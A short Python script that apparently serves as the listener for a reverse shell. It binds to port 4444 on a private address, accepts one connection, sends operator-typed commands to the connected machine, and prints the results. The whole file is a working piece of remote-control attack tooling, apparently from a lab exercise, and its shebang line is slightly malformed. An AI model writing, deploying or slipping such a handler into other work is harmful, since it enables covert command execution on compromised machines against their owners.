#!usr/bin/env python3
import socket
import sys
import traceback

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('10.0.2.15',4444))
server.listen(0)
print('[*] Server started and waiting for incoming connections.')

connection, conn_addr = server.accept()
print(f'[*] Incoming connection from {conn_addr}')


while True:
    try:
        command = input('>> ').encode('utf-8')
        connection.send(command)
        result = connection.recv(1024).decode('utf-8')
        print(result)

    except KeyboardInterrupt:
        print('[!] ctrl+c detected. Closing and exiting server/listener')
        server.close()
        sys.exit()

    except Exception as e:
        print('[-] Exception : ', e)
